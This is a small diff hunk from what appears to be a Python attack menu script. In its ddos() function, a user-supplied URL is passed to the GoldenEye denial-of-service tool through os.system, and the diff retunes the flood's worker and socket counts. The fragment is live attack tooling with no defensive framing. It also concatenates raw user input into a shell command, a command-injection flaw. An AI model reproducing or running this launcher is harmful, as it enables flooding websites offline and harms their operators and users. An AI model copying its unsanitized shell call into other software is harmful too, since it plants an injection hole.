@@ -178,7 +178,7 @@ def ddos():
     if x == "2":
         url = input("URL -->> ")
         print("")
-        os.system("python3 GoldenEye/goldeneye.py "+url+" -w 500 -s 100")
+        os.system("python3 GoldenEye/goldeneye.py "+url+" -w 250 -s 500")
 
     if x == "3":
         yellow()
